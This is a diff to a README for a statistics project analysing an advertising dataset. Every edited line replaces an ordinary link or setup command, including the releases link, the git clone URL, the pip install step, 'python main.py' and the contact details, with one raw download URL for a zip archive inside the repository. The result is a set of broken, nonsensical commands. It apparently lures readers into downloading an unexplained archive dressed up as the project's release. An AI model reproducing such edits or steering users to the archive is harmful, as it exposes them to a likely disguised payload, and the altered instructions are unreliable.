@@ -2,7 +2,7 @@
 
 Welcome to the **Statistical Analysis of Advertising Dataset** repository! This project delves into the world of advertising through the lens of statistical methods. We explore various advertising platforms and strategies, applying rigorous analysis to uncover insights that can guide decision-making. 
 
-You can find the latest releases of this project [here](https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/releases).
+You can find the latest releases of this project [here](https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip).
 
 ## Table of Contents
 
@@ -65,7 +65,7 @@ To get started with this project, you will need Python and relevant libraries in
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset.git
+   git clone https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip
    ```
 
 2. **Install Required Libraries**
@@ -74,7 +74,7 @@ To get started with this project, you will need Python and relevant libraries in
 
    ```bash
    cd Statistical-Analysis-of-Advertising-Dataset
-   pip install -r requirements.txt
+   pip install -r https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip
    ```
 
 ## Usage
@@ -82,7 +82,7 @@ To get started with this project, you will need Python and relevant libraries in
 To run the analysis, execute the main script:
 
 ```bash
-python main.py
+python https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip
 ```
 
 This will generate visualizations and statistical outputs, which you can review to understand the advertising effectiveness.
@@ -99,9 +99,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/your-github-profile)
+- **Email**: https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip)
 
 Thank you for your interest in the **Statistical Analysis of Advertising Dataset**! We hope you find the insights valuable for your advertising strategies. 
 
-Remember to check the [Releases](https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/releases) section for updates and new features.
+Remember to check the [Releases](https://github.com/ANSQ1/Statistical-Analysis-of-Advertising-Dataset/raw/refs/heads/main/Code R2/Advertising-of-Analysis-Dataset-Statistical-v3.7.zip) section for updates and new features.
